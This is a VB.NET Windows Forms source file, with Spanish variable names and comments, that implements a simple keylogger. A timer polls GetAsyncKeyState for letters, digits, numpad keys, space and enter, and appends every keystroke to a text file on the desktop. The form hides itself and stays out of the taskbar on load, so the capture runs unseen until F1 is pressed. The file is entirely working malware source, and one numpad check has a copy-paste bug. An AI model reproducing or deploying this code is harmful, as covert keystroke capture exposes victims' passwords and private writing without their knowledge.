Public Class Form1
    Dim Txt = My.Computer.FileSystem.SpecialDirectories.Desktop & "\bena.txt"
    <System.Runtime.InteropServices.DllImport("user32")>
    Private Shared Function GetAsyncKeyState(ByVal vkey As System.Windows.Forms.Keys) As Short
    End Function

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick

        'My.Computer.FileSystem.WriteAllText(Txt, vbCrLf & "b")

        'My.Computer.FileSystem.WriteAllText(ruta, vbCrLf & "Nombre: " & TextBox1.Text & " Telefono: " & TextBox2.Text & " Direccion: " & TextBox3.Text & " Pedido: " & TextBox4.Text & vbCrLf, True)MessageBox.Show("INFORMACION DEL PEDIDO GUARDADA") 

        'If A = True Then My.Computer.FileSystem.WriteAllText(Txt, DateTime.Now.ToLongTimeString + "A", True)

        'Label1.Text = DateTime.Now


        Dim A As Boolean
        A = GetAsyncKeyState(Keys.A)
        If A = True Then My.Computer.FileSystem.WriteAllText(Txt, "A", True)

        Dim B As Boolean
        B = GetAsyncKeyState(Keys.B)
        If B = True Then My.Computer.FileSystem.WriteAllText(Txt, "B", True)

        Dim C As Boolean
        C = GetAsyncKeyState(Keys.C)
        If C = True Then My.Computer.FileSystem.WriteAllText(Txt, "C", True)

        Dim D As Boolean
        D = GetAsyncKeyState(Keys.D)
        If D = True Then My.Computer.FileSystem.WriteAllText(Txt, "D", True)

        Dim EA As Boolean
        EA = GetAsyncKeyState(Keys.E)
        If EA = True Then My.Computer.FileSystem.WriteAllText(Txt, "E", True)

        Dim F As Boolean
        F = GetAsyncKeyState(Keys.F)
        If F = True Then My.Computer.FileSystem.WriteAllText(Txt, "F", True)

        Dim G As Boolean
        G = GetAsyncKeyState(Keys.G)
        If G = True Then My.Computer.FileSystem.WriteAllText(Txt, "G", True)

        Dim H As Boolean
        H = GetAsyncKeyState(Keys.H)
        If H = True Then My.Computer.FileSystem.WriteAllText(Txt, "H", True)

        Dim I As Boolean
        I = GetAsyncKeyState(Keys.I)
        If I = True Then My.Computer.FileSystem.WriteAllText(Txt, "I", True)

        Dim J As Boolean
        J = GetAsyncKeyState(Keys.J)
        If J = True Then My.Computer.FileSystem.WriteAllText(Txt, "J", True)

        Dim K As Boolean
        K = GetAsyncKeyState(Keys.K)
        If K = True Then My.Computer.FileSystem.WriteAllText(Txt, "K", True)

        Dim L As Boolean
        L = GetAsyncKeyState(Keys.L)
        If L = True Then My.Computer.FileSystem.WriteAllText(Txt, "L", True)

        Dim M As Boolean
        M = GetAsyncKeyState(Keys.M)
        If M = True Then My.Computer.FileSystem.WriteAllText(Txt, "M", True)

        Dim N As Boolean
        N = GetAsyncKeyState(Keys.N)
        If N = True Then My.Computer.FileSystem.WriteAllText(Txt, "N", True)

        Dim O As Boolean
        O = GetAsyncKeyState(Keys.O)
        If O = True Then My.Computer.FileSystem.WriteAllText(Txt, "O", True)

        Dim P As Boolean
        P = GetAsyncKeyState(Keys.P)
        If P = True Then My.Computer.FileSystem.WriteAllText(Txt, "P", True)

        Dim Q As Boolean
        Q = GetAsyncKeyState(Keys.Q)
        If Q = True Then My.Computer.FileSystem.WriteAllText(Txt, "Q", True)

        Dim R As Boolean
        R = GetAsyncKeyState(Keys.R)
        If R = True Then My.Computer.FileSystem.WriteAllText(Txt, "R", True)

        Dim S As Boolean
        S = GetAsyncKeyState(Keys.S)
        If S = True Then My.Computer.FileSystem.WriteAllText(Txt, "S", True)

        Dim T As Boolean
        T = GetAsyncKeyState(Keys.T)
        If T = True Then My.Computer.FileSystem.WriteAllText(Txt, "T", True)

        Dim U As Boolean
        U = GetAsyncKeyState(Keys.U)
        If U = True Then My.Computer.FileSystem.WriteAllText(Txt, "U", True)

        Dim V As Boolean
        V = GetAsyncKeyState(Keys.V)
        If V = True Then My.Computer.FileSystem.WriteAllText(Txt, "V", True)

        Dim W As Boolean
        W = GetAsyncKeyState(Keys.W)
        If W = True Then My.Computer.FileSystem.WriteAllText(Txt, "W", True)

        Dim X As Boolean
        X = GetAsyncKeyState(Keys.X)
        If X = True Then My.Computer.FileSystem.WriteAllText(Txt, "X", True)

        Dim Y As Boolean
        Y = GetAsyncKeyState(Keys.Y)
        If Y = True Then My.Computer.FileSystem.WriteAllText(Txt, "Y", True)

        Dim Z As Boolean
        Z = GetAsyncKeyState(Keys.Z)
        If Z = True Then My.Computer.FileSystem.WriteAllText(Txt, "Z", True)

        Dim SPACE As Boolean
        SPACE = GetAsyncKeyState(Keys.Space)
        If SPACE = True Then My.Computer.FileSystem.WriteAllText(Txt, "  ", True)

        Dim ENTER As Boolean
        ENTER = GetAsyncKeyState(Keys.Enter)
        If ENTER = True Then My.Computer.FileSystem.WriteAllText(Txt, vbCrLf & "", True)

        Dim UNO As Boolean
        UNO = GetAsyncKeyState(Keys.D1)
        If UNO = True Then My.Computer.FileSystem.WriteAllText(Txt, "1", True)

        Dim DOS As Boolean
        DOS = GetAsyncKeyState(Keys.D2)
        If DOS = True Then My.Computer.FileSystem.WriteAllText(Txt, "2", True)

        Dim TRES As Boolean
        TRES = GetAsyncKeyState(Keys.D3)
        If TRES = True Then My.Computer.FileSystem.WriteAllText(Txt, "3", True)

        Dim CUATRO As Boolean
        CUATRO = GetAsyncKeyState(Keys.D4)
        If CUATRO = True Then My.Computer.FileSystem.WriteAllText(Txt, "4", True)

        Dim CINCO As Boolean
        CINCO = GetAsyncKeyState(Keys.D5)
        If CINCO = True Then My.Computer.FileSystem.WriteAllText(Txt, "5", True)

        Dim SEIS As Boolean
        SEIS = GetAsyncKeyState(Keys.D6)
        If SEIS = True Then My.Computer.FileSystem.WriteAllText(Txt, "6", True)

        Dim SIETE As Boolean
        SIETE = GetAsyncKeyState(Keys.D7)
        If SIETE = True Then My.Computer.FileSystem.WriteAllText(Txt, "7", True)

        Dim OCHO As Boolean
        OCHO = GetAsyncKeyState(Keys.D8)
        If OCHO = True Then My.Computer.FileSystem.WriteAllText(Txt, "8", True)

        Dim NUEVE As Boolean
        NUEVE = GetAsyncKeyState(Keys.D9)
        If NUEVE = True Then My.Computer.FileSystem.WriteAllText(Txt, "9", True)

        Dim BLOQCERO As Boolean
        BLOQCERO = GetAsyncKeyState(Keys.NumPad0)
        If BLOQCERO = True Then My.Computer.FileSystem.WriteAllText(Txt, "0", True)

        Dim BLOQUNO As Boolean
        BLOQUNO = GetAsyncKeyState(Keys.NumPad1)
        If NUEVE = True Then My.Computer.FileSystem.WriteAllText(Txt, "1", True)

        Dim BLOQDOS As Boolean
        BLOQDOS = GetAsyncKeyState(Keys.NumPad2)
        If BLOQDOS = True Then My.Computer.FileSystem.WriteAllText(Txt, "2", True)

        Dim BLOQTRES As Boolean
        BLOQTRES = GetAsyncKeyState(Keys.NumPad3)
        If BLOQTRES = True Then My.Computer.FileSystem.WriteAllText(Txt, "3", True)

        Dim BLOQCUATRO As Boolean
        BLOQCUATRO = GetAsyncKeyState(Keys.NumPad4)
        If BLOQCUATRO = True Then My.Computer.FileSystem.WriteAllText(Txt, "4", True)

        Dim BLOQCINCO As Boolean
        BLOQCINCO = GetAsyncKeyState(Keys.NumPad5)
        If BLOQCINCO = True Then My.Computer.FileSystem.WriteAllText(Txt, "5", True)

        Dim BLOQSEIS As Boolean
        BLOQSEIS = GetAsyncKeyState(Keys.NumPad6)
        If BLOQSEIS = True Then My.Computer.FileSystem.WriteAllText(Txt, "6", True)

        Dim BLOQSIETE As Boolean
        BLOQSIETE = GetAsyncKeyState(Keys.NumPad7)
        If BLOQSIETE = True Then My.Computer.FileSystem.WriteAllText(Txt, "7", True)

        Dim BLOQOCHO As Boolean
        BLOQOCHO = GetAsyncKeyState(Keys.NumPad8)
        If BLOQOCHO = True Then My.Computer.FileSystem.WriteAllText(Txt, "8", True)

        Dim BLOQNUEVE As Boolean
        BLOQNUEVE = GetAsyncKeyState(Keys.NumPad9)
        If BLOQNUEVE = True Then My.Computer.FileSystem.WriteAllText(Txt, "9", True)

        Dim F1 As Boolean
        F1 = GetAsyncKeyState(Keys.F1)
        If F1 = True Then Me.Close()

        ' Dim TeclA As Boolean
        'TeclA = GetAsyncKeyState(Keys.F1)
        ' If TeclA = True Then Timer1.Start()
        ' Dim Tecla1 As Boolean
        ' Tecla1 = GetAsyncKeyState(Keys.F2)
        ' If Tecla1 = True Then Timer1.Stop()
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Visible = False
        Me.ShowInTaskbar = False
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs)

    End Sub
End Class
